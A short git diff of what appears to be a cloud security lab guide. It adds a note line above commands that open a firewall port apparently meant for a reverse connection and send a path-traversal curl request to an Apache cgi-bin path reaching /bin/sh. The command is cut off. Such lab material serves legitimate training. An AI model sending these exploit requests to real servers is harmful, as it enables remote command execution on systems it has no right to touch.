@@ -132,6 +132,8 @@ gcloud compute firewall-rules create apache-test-service-fw \
 
 gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
 ```
+## Note: Check the progress on Task 4 then run the following commands
+
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
